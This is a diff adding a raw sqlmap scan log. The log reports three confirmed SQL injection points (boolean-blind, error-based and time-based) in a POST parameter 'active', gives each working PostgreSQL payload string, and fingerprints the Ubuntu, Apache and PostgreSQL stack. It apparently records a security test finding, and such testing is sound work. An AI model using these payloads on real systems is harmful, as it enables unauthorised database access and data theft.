@@ -1,0 +1,18 @@
+sqlmap identified the following injection point(s) with a total of 37 HTTP(s) requests:
+---
+Parameter: active (POST)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: active=true' AND (SELECT (CASE WHEN (8307=8307) THEN NULL ELSE CAST((CHR(85)||CHR(65)||CHR(67)||CHR(85)) AS NUMERIC) END)) IS NULL-- uYOA&mod=true
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: active=true' AND 4826=CAST((CHR(113)||CHR(122)||CHR(122)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (4826=4826) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)-- HhTw&mod=true
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: active=true' AND 1401=(SELECT 1401 FROM PG_SLEEP(5))-- wUjX&mod=true
+---
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: PostgreSQL
